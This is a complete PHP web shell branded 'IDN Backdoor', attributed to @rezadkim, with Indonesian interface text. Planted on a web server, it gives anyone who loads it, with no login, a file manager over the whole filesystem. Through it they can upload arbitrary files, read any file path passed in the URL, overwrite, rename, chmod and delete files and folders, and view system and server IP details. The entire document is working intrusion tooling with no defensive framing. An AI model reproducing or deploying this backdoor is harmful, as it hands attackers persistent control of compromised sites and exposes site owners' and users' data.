<?php
//Remake from MINI SHELL
//@rezadkim
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}

$sistem = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scandir = explode("/", $dir);
$safe = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
echo "
<!DOCTYPE HTML>
<html>
<head>
<meta name='author' content='rezadkim'/>
<link rel='stylesheet' href='style.css'>
<title>IDN Backdoor</title>
</head>
<body>
<div class='lokasi'><font color='red'>lokasi&nbsp</font> : ";
if(isset($_GET['tempat'])){
    $tempat = $_GET['tempat'];
}
else{
    $tempat = getcwd();
}
$tempat = str_replace('\\','/',$tempat);
$tempats = explode('/',$tempat);

foreach($tempats as $uid=>$ini){
    if($ini == '' && $uid == 0){
        $a = true;
        echo "<a href='?tempat=/'>/</a>";
        continue;
    }
    if($ini == '') continue;
    echo "<a href='?tempat=";
    for($i=0;$i<=$uid;$i++){
        echo "$tempats[$i]";
        if($i != $uid) echo "/";
    }
    echo "'>".$ini."</a>/";
}
echo "</td></tr><tr><td>";

/* UPFILE */
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$tempat.'/'.$_FILES['file']['name'])){
        echo "<font color='lime'>Upload Berhasil !</font><br/>";
    }
    else{
        echo "<font color='red'>Upload Gagal !</font><br/>";
    }
}
echo "
<form enctype='multipart/form-data' method='POST'>
<font color='red'>UpFile </font>: <input type='file' name='file'/>
<input type='submit' value='Upload'/>
</form></div>";
echo "
<div class='infor' align='left'>
<img class='gambar' src='https://areapintas.com/images/logo.png' alt='Logo' width='101' height='111'>
<font class='h1' color='red' size='30'>IDN</font><font class='h1' color='white' size='30'> Backdoor</font><br>
<font color='white'>[</font><font color='gold'>+</font><font color='white'>] System : </font><font color='lime'>".$sistem."</font><br>
<font color='white'>[</font><font color='gold'>+</font><font color='white'>] Your IP : </font><font color='lime'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='white'>[</font><font color='gold'>+</font><font color='white'>] Server IP : </font><font color='lime'>".$ip."</font><br>
<font color='white'>[</font><font color='gold'>+</font><font color='white'>] Safe Mode : </font><font color='lime'>".$safe."</font><br></div><br>
<div class='copy'><font color='white'>Copyright 2019. <a href='https://www.instagram.com/rezadkim'>@rezadkim</a></div>";

/* CHMOD */
if(isset($_GET['filesrc'])){
    echo "<center><div class='isi'><tr><td><font color='red'>Lokasi File </font>: ";
    echo $_GET['filesrc'];
    echo "<br></tr></td></table><br/>";
    echo("<textarea cols=80 rows=20 name='src'>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea><br/></div>");
}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo "</table><br/><div class='comot'><center><font color='red'>Lokasi File </font>: ".$_POST['tempat']."<br/><br/>";
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['tempat'],$_POST['perm'])){
                echo "<font color='lime'>Mengganti Izin Diterima !</font><br/>";
            }
            else{
                echo "<font color='red'>Mengganti Izin Ditolak !</font><br/>";
            }
        }
        echo "
        <form method='POST'>
        Izin : <input name='perm' type='text' size='4' value='".substr(sprintf('%o', fileperms($_POST['tempat'])), -4)."'/>
        <input type='hidden' name='tempat' value='".$_POST['tempat']."'>
        <input type='hidden' name='opt' value='chmod'>
        <input type='submit' value='Go'/>
        </form></div>";
    }

    /* RENAME */
    elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['tempat'],$tempat.'/'.$_POST['newname'])){
                echo "<font color='lime'>Ganti Nama Berhasil !</font><br/>";
            }
            else{
                echo "<font color='red'>Ganti Nama Gagal !</font><br/>";
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo "
        <form method='POST'>
        Nama baru : <input name='newname' type='text' size='20' value='".$_POST['name']."'/>
        <input type='hidden' name='tempat' value='".$_POST['tempat']."'>
        <input type='hidden' name='opt' value='rename'>
        <input type='submit' value='Go'/>
        </form>";
    }
    
    /* EDIT */
    elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['tempat'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo "<font color='lime'>Berhasil Edit File !</font><br/>";
            }
            else{
                echo "<font color='red'>Gagal Edit File !</font><br/>";
            }
            fclose($fp);
        }
        echo "
        <form method='POST'>
        <textarea cols=80 rows=20 name='src'>".htmlspecialchars(file_get_contents($_POST['tempat']))."</textarea><br/>
        <input type='hidden' name='tempat' value='".$_POST['tempat']."'>
        <input type='hidden' name='opt' value='edit'>
        <input type='submit' value='Simpan'/>
        </form>";
    }
    echo "</center>";
}
else{
    echo "</table><br/><center>";

    /* Delete */
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        //folder
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['tempat'])){
                echo "<font color='lime'>Folder Berhasil Terhapus !</font><br/>";
            }
            else{
                echo "<font color='red'>Folder Gagal Terhapus !</font><br/>";
            }
        }
        //file
        elseif($_POST['type'] == 'file'){
            if(unlink($_POST['tempat'])){
                echo "<font color='lime'>File Berhasil Terhapus !</font><br/>";
            }
            else{
                echo "<font color='red'>File Gagal Terhapus !</font><br/>";
            }
        }
    }

    /* TABLE MAIN */
    echo "</center>";
    $scandir = scandir($tempat);
    echo "
    <div id='content'>
    <table style='margin-top: -322px;margin-right: 2.5px;' cellspacing='3' cellpadding='3' align='right'>
    <tr class='first'>
    <td><center>Nama Folder/File</center></td>
    <td><center>Ukuran</center></td>
    <td><center>Izin</center></td>
    <td><center>Modifikasi</center></td></tr>";
    foreach($scandir as $dir){
        if(!is_dir($tempat.'/'.$dir) || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href='?tempat=".$tempat."/".$dir."'>".$dir."</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable($tempat.'/'.$dir)) echo "<font color='green'>";
        elseif(!is_readable($tempat.'/'.$dir)) echo "<font color='red'>";
        echo perms($tempat.'/'.$dir);
        if(is_writable($tempat.'/'.$dir) || !is_readable($tempat.'/'.$dir)) echo "</font>";
        echo "</center></td>
        <td><center>
        <form method='POST' action='?option&tempat=".$tempat."'>
        <select name='opt'>
        <option value=''>Select</option>
        <option value='delete'>Delete</option>
        <option value='chmod'>Chmod</option>
        <option value='rename'>Rename</option>
        </select>
        <input type='hidden' name='type' value='dir'>
        <input type='hidden' name='name' value='".$dir."'>
        <input type='hidden' name='tempat' value='".$tempat."/".$dir."'>
        <input type='submit' value='>'>
        </form></center></td></tr>";
    }
    //ukuran
    echo "<tr class='first'><td></td><td></td><td></td><td></td></tr>";
    foreach($scandir as $file){
        if(!is_file($tempat.'/'.$file)) continue;
        $size = filesize($tempat.'/'.$file)/1024;
        $size = round($size,3);
        if(size >= 1024){
            $size = round($size/1024,2).' MB';
        }
        else{
            $size = $size.' KB';
        }
        echo "
        <tr>
        <td><a href='?filesrc=".$tempat."/".$file."&lokasi=".$tempat."'>".$file."</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable($tempat.'/'.$file)) echo "<font color='green'>";
        elseif(!is_readable($tempat.'/'.$file)) echo "<font color='red'>";
        echo perms($tempat.'/'.$file);
        if(is_writable($tempat.'/'.$file) || !is_readable($tempat.'/'.$file)) echo "</font>";
        echo "</center></td>
        <td><center><form method='POST' action='?option&lokasi".$tempat."'>
        <select name='opt'>
        <option value=''>Select</option>
        <option value='delete'>Delete</option>
        <option value='chmod'>Chmod</option>
        <option value='rename'>Rename</option>
        <option value='edit'>Edit</option>
        </select>
        <input type='hidden' name='type' value='file'>
        <input type='hidden' name='name' value='".$file."'>
        <input type='hidden' name='tempat' value='".$tempat."/".$file."'>
        <input type='submit' value='>'>
        </form></center></td></tr>";
    }
    echo "</table></div>";
}

function perms($file){
    $perms = fileperms($file);

    if (($perms & 0xC000) == 0xC000) {
        //soket
        $info = 's';
    }
    elseif (($perms & 0xA000) == 0xA000) {
        //simbol link
        $info = 'l';
    }
    elseif (($perms & 0x8000) == 0x8000) {
        //regular
        $info = '-';
    }
    elseif (($perms & 0x6000) == 0x6000) {
        //Blok spesial
        $info = 'b';
    }
    elseif (($perms & 0x4000) == 0x4000) {
        //directory
        $info = 'd';
    }
    elseif (($perms & 0x2000) == 0x2000) {
        //karakter spesial
        $info = 'c';
    }
    elseif (($perms & 0x1000) == 0x1000) {
        //pipe
        $info = 'p';
    }
    else {
        //unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));

    // Grup
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>